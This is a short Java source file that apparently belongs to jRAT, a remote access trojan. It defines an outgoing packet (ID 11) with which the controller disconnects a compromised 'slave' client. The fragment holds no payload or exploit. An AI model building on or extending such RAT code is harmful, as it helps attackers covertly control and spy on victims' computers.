package pro.jrat.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.Slave;
import pro.jrat.exceptions.CloseException;


public class Packet11Disconnect extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.closeSocket(new CloseException("Disconnecting"));
	}

	@Override
	public byte getPacketId() {
		return 11;
	}

}
